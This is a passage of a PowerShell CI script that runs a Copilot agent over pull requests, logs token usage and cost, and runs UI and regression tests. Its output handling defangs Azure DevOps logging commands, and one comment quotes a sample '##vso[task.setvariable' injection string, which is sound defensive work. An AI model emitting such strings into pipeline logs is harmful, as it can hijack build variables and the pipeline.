    $inputTokens = Get-TokenFieldSum -Fields (Select-CanonicalTokenFields $inputFields)
    $outputTokens = Get-TokenFieldSum -Fields (Select-CanonicalTokenFields $outputFields)
    $cachedInputTokens = Get-TokenFieldSum -Fields (Select-CanonicalTokenFields $cachedInputFields)
    $totalTokens = Get-TokenFieldSum -Fields (Select-CanonicalTokenFields $explicitTotalFields)
    if ($null -eq $totalTokens -and ($null -ne $inputTokens -or $null -ne $outputTokens)) {
        $totalTokens = [long](($inputTokens ?? 0) + ($outputTokens ?? 0))
    }

    return [ordered]@{
        inputTokens       = $inputTokens
        outputTokens      = $outputTokens
        cachedInputTokens = $cachedInputTokens
        totalTokens       = $totalTokens
        rawTokenFields    = @($tokenFields)
    }
}

function Convert-CopilotCompactNumber {
    param([string]$Value)

    if ([string]::IsNullOrWhiteSpace($Value)) { return $null }

    $normalized = ($Value -replace ',', '').Trim()
    if ($normalized -notmatch '^(?<number>[0-9]+(?:\.[0-9]+)?)\s*(?<suffix>[KMGkmg])?$') {
        return $null
    }

    $number = [double]$Matches['number']
    $multiplier = switch ($Matches['suffix'].ToUpperInvariant()) {
        'K' { 1000 }
        'M' { 1000000 }
        'G' { 1000000000 }
        default { 1 }
    }

    return [long][Math]::Round($number * $multiplier)
}

function Get-CopilotCliUsageLineData {
    param([string]$Line)

    $data = [ordered]@{}
    if ([string]::IsNullOrWhiteSpace($Line)) {
        return $data
    }

    if ($Line -match 'Session:\s*(?<aic>[0-9]+(?:\.[0-9]+)?)\s*AIC\s+used') {
        $data.aicUsed = [double]$Matches['aic']
    }

    if ($Line -match '^\s*(?<model>.+?)\s*[\u2022\u00b7]\s*(?<context>[0-9][0-9,]*(?:\.[0-9]+)?\s*[KMGkmg]?)\s+context\s*$') {
        $contextRaw = $Matches['context'].Trim()
        $data.model = $Matches['model'].Trim()
        $data.contextWindowRaw = $contextRaw
        $data.contextWindow = Convert-CopilotCompactNumber -Value $contextRaw
    }

    return $data
}

function Get-CopilotOtelTokenMetrics {
    param([string]$Path)

    $metrics = [ordered]@{
        inputTokens          = $null
        outputTokens         = $null
        cachedInputTokens    = $null
        reasoningOutputTokens = $null
        totalTokens          = $null
        copilotCost          = $null
        available            = $false
        file                 = $Path
    }

    if ([string]::IsNullOrWhiteSpace($Path) -or -not (Test-Path $Path)) {
        return $metrics
    }

    $spanSums = @{
        input     = 0.0
        output    = 0.0
        cached    = 0.0
        reasoning = 0.0
        cost      = 0.0
    }
    $spanSeen = @{
        input     = $false
        output    = $false
        cached    = $false
        reasoning = $false
        cost      = $false
    }

    $metricSums = @{
        input  = 0.0
        output = 0.0
        cached = 0.0
    }
    $metricSeen = @{
        input  = $false
        output = $false
        cached = $false
    }

    foreach ($line in Get-Content -Path $Path -Encoding UTF8) {
        if ([string]::IsNullOrWhiteSpace($line)) { continue }

        try {
            $entry = $line | ConvertFrom-Json -ErrorAction Stop
        } catch {
            continue
        }

        if ($entry.type -eq 'span' -and $entry.attributes) {
            $attributes = $entry.attributes
            $inputValue = Get-ObjectMemberValue -InputObject $attributes -Names @('gen_ai.usage.input_tokens')
            $outputValue = Get-ObjectMemberValue -InputObject $attributes -Names @('gen_ai.usage.output_tokens')
            $cachedValue = Get-ObjectMemberValue -InputObject $attributes -Names @('gen_ai.usage.cache_read.input_tokens', 'gen_ai.usage.cache_read_input_tokens')
            $reasoningValue = Get-ObjectMemberValue -InputObject $attributes -Names @('gen_ai.usage.reasoning.output_tokens', 'gen_ai.usage.reasoning_output_tokens')
            $costValue = Get-ObjectMemberValue -InputObject $attributes -Names @('github.copilot.cost')

            if (Test-IsNumericValue $inputValue) { $spanSums.input += [double]$inputValue; $spanSeen.input = $true }
            if (Test-IsNumericValue $outputValue) { $spanSums.output += [double]$outputValue; $spanSeen.output = $true }
            if (Test-IsNumericValue $cachedValue) { $spanSums.cached += [double]$cachedValue; $spanSeen.cached = $true }
            if (Test-IsNumericValue $reasoningValue) { $spanSums.reasoning += [double]$reasoningValue; $spanSeen.reasoning = $true }
            if (Test-IsNumericValue $costValue) { $spanSums.cost += [double]$costValue; $spanSeen.cost = $true }
        } elseif ($entry.type -eq 'metric' -and $entry.name -eq 'gen_ai.client.token.usage') {
            foreach ($point in @($entry.dataPoints)) {
                $tokenType = [string](Get-ObjectMemberValue -InputObject $point.attributes -Names @('gen_ai.token.type'))
                $sumValue = Get-ObjectMemberValue -InputObject $point.value -Names @('sum')
                if (-not (Test-IsNumericValue $sumValue)) { continue }

                if ($tokenType -eq 'input') {
                    $metricSums.input += [double]$sumValue
                    $metricSeen.input = $true
                } elseif ($tokenType -eq 'output') {
                    $metricSums.output += [double]$sumValue
                    $metricSeen.output = $true
                } elseif ($tokenType -match '(?i)cache') {
                    $metricSums.cached += [double]$sumValue
                    $metricSeen.cached = $true
                }
            }
        }
    }

    $inputTokens = if ($spanSeen.input) { [long][Math]::Round($spanSums.input) } elseif ($metricSeen.input) { [long][Math]::Round($metricSums.input) } else { $null }
    $outputTokens = if ($spanSeen.output) { [long][Math]::Round($spanSums.output) } elseif ($metricSeen.output) { [long][Math]::Round($metricSums.output) } else { $null }
    $cachedInputTokens = if ($spanSeen.cached) { [long][Math]::Round($spanSums.cached) } elseif ($metricSeen.cached) { [long][Math]::Round($metricSums.cached) } else { $null }
    $reasoningOutputTokens = if ($spanSeen.reasoning) { [long][Math]::Round($spanSums.reasoning) } else { $null }
    $copilotCost = if ($spanSeen.cost) { [Math]::Round($spanSums.cost, 3) } else { $null }

    $totalTokens = if ($null -ne $inputTokens -or $null -ne $outputTokens) {
        [long](($inputTokens ?? 0) + ($outputTokens ?? 0))
    } else {
        $null
    }

    $metrics.inputTokens = $inputTokens
    $metrics.outputTokens = $outputTokens
    $metrics.cachedInputTokens = $cachedInputTokens
    $metrics.reasoningOutputTokens = $reasoningOutputTokens
    $metrics.totalTokens = $totalTokens
    $metrics.copilotCost = $copilotCost
    $metrics.available = ($null -ne $inputTokens -or $null -ne $outputTokens -or $null -ne $cachedInputTokens -or $null -ne $copilotCost)

    return $metrics
}

function New-CopilotTokenUsageRecord {
    param(
        [int]$PRNumber,
        [string]$Platform,
        [string]$Phase,
        [string]$StepName,
        [string]$ModelName,
        [datetimeoffset]$StartedAtUtc,
        [datetimeoffset]$EndedAtUtc,
        [long]$DurationMs,
        [int]$TurnCount,
        [int]$ToolCount,
        [int]$FailedToolCount,
        [object]$Usage,
        [object]$OtelMetrics,
        [object]$AicUsed,
        [object]$ContextWindow,
        [string]$ContextWindowRaw,
        [bool]$ResultEventSeen,
        [int]$ExitCode
    )

    $apiDurationValue = Get-ObjectMemberValue -InputObject $Usage -Names @('totalApiDurationMs', 'total_api_duration_ms')
    $apiDurationMs = if (Test-IsNumericValue $apiDurationValue) { [long]$apiDurationValue } else { $null }
    $usageTokenMetrics = Get-CopilotTokenMetrics -Usage $Usage

    $inputTokens = $usageTokenMetrics.inputTokens
    $outputTokens = $usageTokenMetrics.outputTokens
    $cachedInputTokens = $usageTokenMetrics.cachedInputTokens
    $totalTokens = $usageTokenMetrics.totalTokens
    $reasoningOutputTokens = $null
    $copilotCost = $null
    $otelFile = $null

    if ($OtelMetrics) {
        if ($null -eq $inputTokens -and $null -ne $OtelMetrics.inputTokens) { $inputTokens = $OtelMetrics.inputTokens }
        if ($null -eq $outputTokens -and $null -ne $OtelMetrics.outputTokens) { $outputTokens = $OtelMetrics.outputTokens }
        if ($null -eq $cachedInputTokens -and $null -ne $OtelMetrics.cachedInputTokens) { $cachedInputTokens = $OtelMetrics.cachedInputTokens }
        if ($null -eq $totalTokens -and $null -ne $OtelMetrics.totalTokens) { $totalTokens = $OtelMetrics.totalTokens }
        $reasoningOutputTokens = $OtelMetrics.reasoningOutputTokens
        $copilotCost = $OtelMetrics.copilotCost
        $otelFile = $OtelMetrics.file
    }

    # Keep billing units separate — never fall back across unit types (AIC credits vs dollar
    # cost vs request count). Collapsing them into one field produces meaningless aggregate
    # sums (credits + dollars + counts) for the downstream consumer.
    $aicUsed = $AicUsed
    $premiumRequests = Get-ObjectMemberValue -InputObject $Usage -Names @('premiumRequests')
    if (Test-IsNumericValue $premiumRequests) {
        $premiumRequests = [double]$premiumRequests
    } else {
        $premiumRequests = $null
    }

    return [ordered]@{
        schemaVersion         = 1
        generatedAtUtc        = ([DateTimeOffset]::UtcNow).ToString('o')
        prNumber              = $PRNumber
        platform              = $Platform
        pipeline              = [ordered]@{
            buildId        = $env:BUILD_BUILDID
            buildNumber    = $env:BUILD_BUILDNUMBER
            definitionName = $env:BUILD_DEFINITIONNAME
            stageName      = $env:SYSTEM_STAGENAME
            jobName        = $env:SYSTEM_JOBNAME
            jobDisplayName = $env:SYSTEM_JOBDISPLAYNAME
            taskInstanceId = $env:SYSTEM_TASKINSTANCEID
        }
        scriptPhase           = if ($Phase) { $Phase } else { 'All' }
        copilotStep           = $StepName
        model                 = $ModelName
        startedAtUtc          = $StartedAtUtc.ToString('o')
        endedAtUtc            = $EndedAtUtc.ToString('o')
        durationMs            = $DurationMs
        apiDurationMs         = $apiDurationMs
        resultEventSeen       = $ResultEventSeen
        exitCode              = $ExitCode
        turnCount             = $TurnCount
        toolCount             = $ToolCount
        failedToolCount       = $FailedToolCount
        cliUsage              = [ordered]@{
            aicUsed          = $aicUsed
            copilotCost      = $copilotCost
            premiumRequests  = $premiumRequests
            contextWindow    = $ContextWindow
            contextWindowRaw = $ContextWindowRaw
        }
        normalizedTokens      = [ordered]@{
            inputTokens           = $inputTokens
            outputTokens          = $outputTokens
            cachedInputTokens     = $cachedInputTokens
            reasoningOutputTokens = $reasoningOutputTokens
            totalTokens           = $totalTokens
            rawTokenFields        = @($usageTokenMetrics.rawTokenFields)
            otelFile              = $otelFile
        }
        usage                 = $Usage
        costEstimateAvailable = $false
        costEstimateNote      = 'Dollar cost not calculated; no trusted rate table configured.'
    }
}

function Write-CopilotTokenUsageRecord {
    param(
        [string]$OutputDir,
        [object]$Record
    )

    if ([string]::IsNullOrWhiteSpace($OutputDir) -or $null -eq $Record) {
        return
    }

    try {
        New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
        $stepName = [string]$Record.copilotStep
        $safeStepName = ($stepName -replace '[^A-Za-z0-9._-]+', '-').Trim('-')
        if ([string]::IsNullOrWhiteSpace($safeStepName)) {
            $safeStepName = 'copilot-step'
        }

        $timestamp = [DateTimeOffset]::UtcNow.ToString('yyyyMMddTHHmmssfffZ')
        $fileName = "copilot-token-usage-$timestamp-$safeStepName-$([guid]::NewGuid().ToString('N')).json"
        $path = Join-Path $OutputDir $fileName
        $Record | ConvertTo-Json -Depth 50 | Set-Content -Path $path -Encoding UTF8
        Write-Host "  Token usage record: $path" -ForegroundColor DarkGray
    } catch {
        Write-Host "  WARNING: Failed to write Copilot token usage record: $_" -ForegroundColor Yellow
    }
}

# ─── Helper: Invoke Copilot ──────────────────────────────────────────────────
function Invoke-CopilotStep {
    param([string]$StepName, [string]$Prompt)

    Write-Host ""
    Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host "║  $($StepName.PadRight(55))║" -ForegroundColor Magenta
    Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Magenta

    if ($DryRun) {
        Write-Host "[DRY RUN] Prompt:" -ForegroundColor Magenta
        Write-Host $Prompt -ForegroundColor Gray
        return 0
    }

    $startedAtUtc = [DateTimeOffset]::UtcNow
    $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    $toolCount = 0
    $turnCount = 0
    $currentIntent = ""
    $modelName = ""
    $failedTools = @()
    $resultEventSeen = $false
    $resultUsage = $null
    $cliAicUsed = $null
    $cliContextWindow = $null
    $cliContextWindowRaw = $null

    # Tool icon mapping for common tools
    $toolIcons = @{
        'bash'    = '🖥️'; 'view'   = '📄'; 'edit'   = '✏️'; 'create' = '📝'
        'grep'    = '🔍'; 'glob'   = '📂'; 'task'   = '🤖'; 'skill'  = '⚡'
        'sql'     = '🗃️'; 'web_search' = '🌐'; 'ask_user' = '❓'
        'github-mcp-server-pull_request_read' = '🔀'
        'github-mcp-server-issue_read'        = '🐛'
        'github-mcp-server-get_file_contents'  = '📦'
        'github-mcp-server-search_code'        = '🔎'
    }

    # Use JSON output format to stream live progress of agent activity.
    # --secret-env-vars: defense-in-depth — strips named tokens from copilot's
    # shell/MCP subprocess env even if they somehow appear (e.g., via variable groups).
    # Model is overridable via $env:COPILOT_REVIEW_MODEL so contributors without internal-model access
    # can run this script (e.g., with 'claude-opus-4.6' or 'claude-sonnet-4.6').
    $copilotModel = if ($env:COPILOT_REVIEW_MODEL) { $env:COPILOT_REVIEW_MODEL } else { 'gpt-5.5' }
    if ([string]::IsNullOrWhiteSpace($modelName)) {
        $modelName = $copilotModel
    }
    $safeOtelStepName = ($StepName -replace '[^A-Za-z0-9._-]+', '-').Trim('-')
    if ([string]::IsNullOrWhiteSpace($safeOtelStepName)) {
        $safeOtelStepName = 'copilot-step'
    }
    $otelPath = $null
    if (-not [string]::IsNullOrWhiteSpace($TokenUsageOutputDir)) {
        New-Item -ItemType Directory -Path $TokenUsageOutputDir -Force | Out-Null
        $otelPath = Join-Path $TokenUsageOutputDir "copilot-otel-$([DateTimeOffset]::UtcNow.ToString('yyyyMMddTHHmmssfffZ'))-$safeOtelStepName-$([guid]::NewGuid().ToString('N')).jsonl"
    }

    $savedOtel = @{
        COPILOT_OTEL_FILE_EXPORTER_PATH = $env:COPILOT_OTEL_FILE_EXPORTER_PATH
        COPILOT_OTEL_EXPORTER_TYPE      = $env:COPILOT_OTEL_EXPORTER_TYPE
        OTEL_INSTRUMENTATION_GENAI_CAPTURE_MESSAGE_CONTENT = $env:OTEL_INSTRUMENTATION_GENAI_CAPTURE_MESSAGE_CONTENT
    }
    try {
        if ($otelPath) {
            $env:COPILOT_OTEL_FILE_EXPORTER_PATH = $otelPath
            $env:COPILOT_OTEL_EXPORTER_TYPE = 'file'
            $env:OTEL_INSTRUMENTATION_GENAI_CAPTURE_MESSAGE_CONTENT = 'false'
        }

        & copilot -p $Prompt --allow-all --output-format json --model $copilotModel --secret-env-vars=GH_TOKEN,COPILOT_GITHUB_TOKEN,GITHUB_TOKEN 2>&1 | ForEach-Object {
            $line = $_.ToString()
            try {
                $event = $line | ConvertFrom-Json -ErrorAction Stop
                switch ($event.type) {
                    'session.tools_updated' {
                        if ($event.data.model) {
                            $modelName = $event.data.model
                            Write-Host "  ⚙️  Model: " -ForegroundColor DarkGray -NoNewline
                            Write-Host $modelName -ForegroundColor DarkCyan
                        }
                    }
                    'assistant.turn_start' {
                        $turnCount++
                        $elapsed = $stopwatch.Elapsed.ToString("mm\:ss")
                        Write-Host ""
                        Write-Host "  ┌─ Turn $turnCount " -ForegroundColor DarkGray -NoNewline
                        Write-Host "[$elapsed]" -ForegroundColor DarkYellow -NoNewline
                        if ($currentIntent) {
                            Write-Host " · $currentIntent" -ForegroundColor DarkCyan
                        } else {
                            Write-Host ""
                        }
                    }
                    'assistant.turn_end' {
                        Write-Host "  └─" -ForegroundColor DarkGray
                    }
                    'tool.execution_start' {
                        $toolName = $event.data.toolName
                        $args_ = $event.data.arguments

                        # Capture intent changes silently
                        if ($toolName -eq 'report_intent') {
                            # Sanitize once at the store so every later echo (incl. the
                            # assistant.turn_start " · $currentIntent" line) inherits the safe value.
                            $currentIntent = ConvertTo-AzdoSafeConsole ($args_.intent ?? $currentIntent)
                            Write-Host "  │  🎯 " -ForegroundColor DarkGray -NoNewline
                            Write-Host $currentIntent -ForegroundColor Yellow
                            break
                        }

                        $toolCount++
                        $icon = $toolIcons[$toolName]
                        if (-not $icon) {
                            # Prefix match for github-mcp-server-* and other compound names
                            $icon = if ($toolName -like 'github-*') { '🔀' } else { '🔧' }
                        }

                        # Build a short display name for long tool names
                        $displayName = ConvertTo-AzdoSafeConsole ($toolName -replace '^github-mcp-server-', 'gh/')

                        # Pick the most useful detail from arguments
                        $detail = $args_.description ?? $args_.intent ?? ''
                        if (-not $detail) {
                            # Fallback: pick first informative arg
                            $detail = $args_.command ?? $args_.pattern ?? $args_.query ?? $args_.path ?? $args_.prompt ?? ''
                        }
                        if ($detail) {
                            $detail = $detail.Substring(0, [Math]::Min($detail.Length, 90))
                            # Truncate at last word boundary if we cut mid-word
                            if ($detail.Length -eq 90) {
                                $lastSpace = $detail.LastIndexOf(' ')
                                if ($lastSpace -gt 60) { $detail = $detail.Substring(0, $lastSpace) + "…" }
                                else { $detail += "…" }
                            }
                        }

                        Write-Host "  │  $icon " -ForegroundColor DarkGray -NoNewline
                        Write-Host $displayName -ForegroundColor Cyan -NoNewline
                        if ($detail) {
                            Write-Host "  $(ConvertTo-AzdoSafeConsole $detail)" -ForegroundColor DarkGray
                        } else {
                            Write-Host ""
                        }
                    }
                    'tool.execution_complete' {
                        if (-not $event.data.success) {
                            $failedTool = $event.data.toolCallId
                            $failedTools += $failedTool
                            Write-Host "  │  ❌ Tool failed" -ForegroundColor Red
                        }
                    }
                    'assistant.message' {
                        $content = $event.data.content
                        # Show agent text responses (skip empty tool-request-only messages)
                        if ($content -and $content.Trim()) {
                            $preview = $content.Trim()
                            if ($preview.Length -gt 400) {
                                $preview = $preview.Substring(0, 400) + "…"
                            }
                            # Agent message content is PR-influenceable; defang AzDO logging-command
                            # prefixes + strip CR before echoing so it can't inject a pipeline command.
                            $preview = ConvertTo-AzdoSafeConsole $preview
                            Write-Host "  │  💬 " -ForegroundColor DarkGray -NoNewline
                            Write-Host $preview -ForegroundColor White
                        }
                    }
                    'result' {
                        # Final stats — note: 'result' is a top-level event with no 'data' wrapper.
                        $resultEventSeen = $true
                        $usage = $event.usage
                        $resultUsage = $usage
                        if ($usage) {
                            $elapsed = $stopwatch.Elapsed.ToString("mm\:ss")
                            $apiMs = if ($usage.totalApiDurationMs) { [math]::Round($usage.totalApiDurationMs / 1000, 1) } else { "?" }
                            $changes = $usage.codeChanges
                            $filesChanged = if ($changes -and $changes.filesModified) { @($changes.filesModified).Count } else { 0 }
                            $linesAdded = if ($changes) { $changes.linesAdded } else { 0 }
                            $linesRemoved = if ($changes) { $changes.linesRemoved } else { 0 }

                            Write-Host ""
                            Write-Host "  ╭──────────────────────────────────────────╮" -ForegroundColor DarkGray
                            Write-Host "  │  ⏱  $elapsed elapsed  ($($apiMs)s API)" -ForegroundColor DarkGray -NoNewline
                            Write-Host "  │  🔧 $toolCount tools" -ForegroundColor DarkGray -NoNewline
                            Write-Host "  │  🔄 $turnCount turns" -ForegroundColor DarkGray
                            if ($filesChanged -gt 0 -or $linesAdded -gt 0 -or $linesRemoved -gt 0) {
                                Write-Host "  │  📝 $filesChanged files  " -ForegroundColor DarkGray -NoNewline
                                Write-Host "+$linesAdded" -ForegroundColor Green -NoNewline
                                Write-Host "/" -ForegroundColor DarkGray -NoNewline
                                Write-Host "-$linesRemoved" -ForegroundColor Red
                            }
                            Write-Host "  ╰──────────────────────────────────────────╯" -ForegroundColor DarkGray
                        }
                    }
                }
            } catch {
                $cliLineData = Get-CopilotCliUsageLineData -Line $line
                if ($cliLineData.Contains('aicUsed')) {
                    $cliAicUsed = $cliLineData.aicUsed
                }
                if ($cliLineData.Contains('contextWindow')) {
                    $cliContextWindow = $cliLineData.contextWindow
                    $cliContextWindowRaw = $cliLineData.contextWindowRaw
                }
                if ($cliLineData.Contains('model') -and -not [string]::IsNullOrWhiteSpace([string]$cliLineData.model)) {
                    $modelName = [string]$cliLineData.model
                }

                # Non-JSON line (e.g. stats) — strip CR and defang any AzDO logging-command
                # prefix (##vso[ / ##[) so PR-influenced Copilot output can't inject a
                # pipeline command (e.g. "\r##vso[task.setvariable...]"), then echo as-is.
                if ($line.Trim()) {
                    $safeLine = ($line -replace "`r", '') -replace '##(?=\[|vso\[)', '## '
                    Write-Host "  $safeLine" -ForegroundColor DarkGray
                }
            }
        }
    } finally {
        foreach ($key in $savedOtel.Keys) {
            if ($null -eq $savedOtel[$key]) {
                Remove-Item -Path ("env:" + $key) -ErrorAction SilentlyContinue
            } else {
                Set-Item -Path ("env:" + $key) -Value $savedOtel[$key]
            }
        }
    }
    $exitCode = $LASTEXITCODE
    $stopwatch.Stop()
    $endedAtUtc = [DateTimeOffset]::UtcNow
    $otelMetrics = Get-CopilotOtelTokenMetrics -Path $otelPath

    $usageRecord = New-CopilotTokenUsageRecord `
        -PRNumber $PRNumber `
        -Platform $Platform `
        -Phase $Phase `
        -StepName $StepName `
        -ModelName $modelName `
        -StartedAtUtc $startedAtUtc `
        -EndedAtUtc $endedAtUtc `
        -DurationMs $stopwatch.ElapsedMilliseconds `
        -TurnCount $turnCount `
        -ToolCount $toolCount `
        -FailedToolCount (@($failedTools).Count) `
        -Usage $resultUsage `
        -OtelMetrics $otelMetrics `
        -AicUsed $cliAicUsed `
        -ContextWindow $cliContextWindow `
        -ContextWindowRaw $cliContextWindowRaw `
        -ResultEventSeen $resultEventSeen `
        -ExitCode $exitCode
    Write-CopilotTokenUsageRecord -OutputDir $TokenUsageOutputDir -Record $usageRecord

    if ($exitCode -eq 0) {
        Write-Host "  ✅ $StepName completed" -ForegroundColor Green
    } else {
        Write-Host "  ⚠️ $StepName exited with code: $exitCode" -ForegroundColor Yellow
    }
    if ($failedTools.Count -gt 0) {
        Write-Host "  ⚠️  $($failedTools.Count) tool(s) failed during execution" -ForegroundColor Yellow
    }
    return $exitCode
}

# ═════════════════════════════════════════════════════════════════════════════
#  STEP 2: DETECT UI Test Categories (detection only — no pipeline trigger)
# ═════════════════════════════════════════════════════════════════════════════

if ($runGate) {

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║  STEP 2: DETECT UI TEST CATEGORIES                       ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan

$uitestCategories = ""

$detectScript = Join-Path $EngScriptsDir "detect-ui-test-categories.ps1"
if (Test-Path $detectScript) {
    try {
        $detectOutput = & pwsh -NoProfile -File $detectScript -PrNumber "$PRNumber" 2>&1
        $detectOutput | ForEach-Object { Write-Host "  $_" }

        foreach ($line in $detectOutput) {
            $lineStr = $line.ToString()
            # Match even when the marker is followed by an empty value — `''` is
            # the explicit "run all" sentinel emitted by the run-all returns in
            # detect-ui-test-categories.ps1; treating it as "marker not seen"
            # would lose that distinction.
            if ($lineStr -match 'UITestCategoryList;isOutput=true\](.*)$') {
                $uitestCategories = $Matches[1]
            }
        }

        if ($uitestCategories -eq 'NONE') {
            Write-Host "  ℹ️ No UI test categories needed (no UI-relevant changes)" -ForegroundColor DarkGray
        } elseif ([string]::IsNullOrWhiteSpace($uitestCategories)) {
            Write-Host "  ℹ️ Full UI test matrix (no specific categories detected)" -ForegroundColor DarkGray
        } else {
            Write-Host "  🎯 Detected categories: $uitestCategories" -ForegroundColor Green
        }

        # Emit detected categories as an AzDO output variable so downstream
        # stages (RunDeepUITests, UpdateAISummaryComment) in ci-copilot.yml
        # can read them via $(stageDependencies.ReviewPR.CopilotReview.outputs['RunGate.detectedCategories']).
        # `isOutput=true` is required for cross-stage consumption; the
        # variable name is namespaced under the step's `name:` property
        # in ci-copilot.yml (currently `RunGate`) by AzDO.
        # Local invocations (no $env:TF_BUILD) won't have an AzDO variable
        # store but the marker is harmless — gets ignored.
        # Emit detected categories. Blank = "run all", a specific string = categories,
        # NONE = no UI tests needed. Preserve blank as 'ALL' (not NONE) so Stage 2
        # can distinguish "run everything" from "run nothing".
        $catsForOutput = if ($uitestCategories -eq 'NONE') { 'NONE' }
                         elseif ([string]::IsNullOrWhiteSpace($uitestCategories)) { 'ALL' }
                         else { $uitestCategories }
        Write-Host "##vso[task.setvariable variable=detectedCategories;isOutput=true]$catsForOutput"
        Write-Host "##vso[task.setvariable variable=detectedPlatform;isOutput=true]$Platform"

        # Write detection result for AI summary
        $uitestOutputDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/uitests"
        New-Item -ItemType Directory -Force -Path $uitestOutputDir | Out-Null
        if ($uitestCategories -eq 'NONE') {
            "No UI test categories needed for this PR (no UI-relevant changes)." | Set-Content (Join-Path $uitestOutputDir "content.md") -Encoding UTF8
        } elseif ([string]::IsNullOrWhiteSpace($uitestCategories)) {
            "Full UI test matrix will run (no specific categories detected from PR changes)." | Set-Content (Join-Path $uitestOutputDir "content.md") -Encoding UTF8
        } else {
            "**Detected UI test categories:** ``$uitestCategories``" | Set-Content (Join-Path $uitestOutputDir "content.md") -Encoding UTF8
        }
    } catch {
        Write-Host "  ⚠️ Category detection failed (non-fatal): $_" -ForegroundColor Yellow
    }
} else {
    Write-Host "  ⚠️ detect-ui-test-categories.ps1 not found" -ForegroundColor Yellow
}

# Belt-and-suspenders: the detect script's manual-PR mode does
# `git checkout $headSha`, leaving HEAD detached. Its own try/finally restores
# the previous ref, but if that finally is skipped (process killed, scripting
# error before the outer try opens) we'd run subsequent steps against the
# wrong tree. Force HEAD back to the review branch and fail loudly if we can't.
git checkout $reviewBranch 2>$null | Out-Null
if ($LASTEXITCODE -ne 0) {
    Write-Host "  ⚠️ Failed to restore review branch '$reviewBranch' after Step 2 — subsequent steps may run against the wrong tree" -ForegroundColor Red
}

# ═════════════════════════════════════════════════════════════════════════════
#  STEP 3: REGRESSION CROSS-REFERENCE (script, no copilot agent)
# ═════════════════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║  STEP 3: REGRESSION CROSS-REFERENCE                      ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan

$regressionOutputDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/regression-check"
$regressionScript = Join-Path $ScriptsDir "Find-RegressionRisks.ps1"
if (Test-Path $regressionScript) {
    try {
        & $regressionScript -PRNumber $PRNumber -OutputDir $regressionOutputDir
        $regressionResult = if (Test-Path (Join-Path $regressionOutputDir "result.txt")) {
            (Get-Content (Join-Path $regressionOutputDir "result.txt") -Raw).Trim()
        } else { 'UNKNOWN' }

        switch ($regressionResult) {
            'REVERT'  { Write-Host "  🔴 Regression risks detected — see regression-check/content.md" -ForegroundColor Red }
            'OVERLAP' { Write-Host "  🟡 Overlaps with prior bug-fix PRs (lower risk)" -ForegroundColor Yellow }
            'CLEAN'   { Write-Host "  🟢 No regression risk detected" -ForegroundColor Green }
            default   { Write-Host "  ⚠️ Unexpected regression-check result: $regressionResult" -ForegroundColor Yellow }
        }
    } catch {
        Write-Host "  ⚠️ Regression check failed (non-fatal): $_" -ForegroundColor Yellow
        # Write a fallback content.md so downstream steps don't break
        New-Item -ItemType Directory -Force -Path $regressionOutputDir | Out-Null
        "⚠️ Regression cross-reference failed: $_" | Set-Content (Join-Path $regressionOutputDir "content.md") -Encoding UTF8
    }
} else {
    Write-Host "  ⚠️ Find-RegressionRisks.ps1 not found" -ForegroundColor Yellow
}

# --- Regression Test Execution (part of STEP 3) ---
$regressionTestResult = "SKIPPED"
$regressionRisksJson = Join-Path $regressionOutputDir "risks.json"
if (Test-Path $regressionRisksJson) {
    try {
        $risksData = Get-Content $regressionRisksJson -Raw -Encoding UTF8 | ConvertFrom-Json
    } catch {
        $risksData = $null
    }
}

if ($risksData -and ($risksData.result -eq 'REVERT' -or $risksData.result -eq 'OVERLAP')) {
    # Collect regression tests from ALL risk entries (REVERT + OVERLAP)
    $regressionTests = @()
    foreach ($risk in @($risksData.risks | Where-Object { $_.regression_tests.Count -gt 0 })) {
        foreach ($test in $risk.regression_tests) {
            $regressionTests += [PSCustomObject]@{
                FixPR       = $risk.recent_pr
                Type        = $test.type
                TestName    = $test.test_name
                Filter      = $test.filter
                ProjectPath = $test.project_path
                Project     = $test.project
                Runner      = $test.runner
            }
        }
    }

    if ($regressionTests.Count -gt 0) {
        Write-Host ""
        Write-Host "  🧪 Running $($regressionTests.Count) regression test(s) from fix PRs…" -ForegroundColor Cyan

        $regrTestOutputDir = Join-Path $regressionOutputDir "test-results"
        New-Item -ItemType Directory -Force -Path $regrTestOutputDir | Out-Null

        $regrTestPassed = 0
        $regrTestFailed = 0
        $regrTestSkipped = 0
        $regrTestDetails = @()

        $regrPlatform = if ($Platform) { $Platform } else { "android" }
        $uiTestRunner = Join-Path $ScriptsDir "BuildAndRunHostApp.ps1"
        $deviceTestRunner = Join-Path $SkillsDir "run-device-tests/scripts/Run-DeviceTests.ps1"

        foreach ($t in $regressionTests) {
            Write-Host ""
            Write-Host "  📋 [$($t.Type)] $($t.TestName) (from fix PR #$($t.FixPR))" -ForegroundColor Cyan

            try {
                switch ($t.Type) {
                    'UITest' {
                        if (Test-Path $uiTestRunner) {
                            Write-Host "    🖥️ Running UI test via BuildAndRunHostApp.ps1 -Platform $regrPlatform -TestFilter `"$($t.Filter)`"" -ForegroundColor Cyan
                            $testOutput = Invoke-WithoutGhTokens { & $uiTestRunner -Platform $regrPlatform -TestFilter $t.Filter 2>&1 }
                            $testExitCode = $LASTEXITCODE
                            $testOutput | Select-Object -Last 20 | ForEach-Object { Write-Host "    $_" }
                        } else {
                            Write-Host "    ⚠️ BuildAndRunHostApp.ps1 not found" -ForegroundColor Yellow
                            $testExitCode = -1
                        }
                    }
                    'DeviceTest' {
                        if (Test-Path $deviceTestRunner) {
                            $dtProject = if ($t.Project) { $t.Project } else { 'Controls' }
                            Write-Host "    📱 Running device test via Run-DeviceTests.ps1 -Project $dtProject -Platform $regrPlatform -TestFilter `"$($t.Filter)`"" -ForegroundColor Cyan
                            $testOutput = Invoke-WithoutGhTokens { & $deviceTestRunner -Project $dtProject -Platform $regrPlatform -TestFilter $t.Filter 2>&1 }
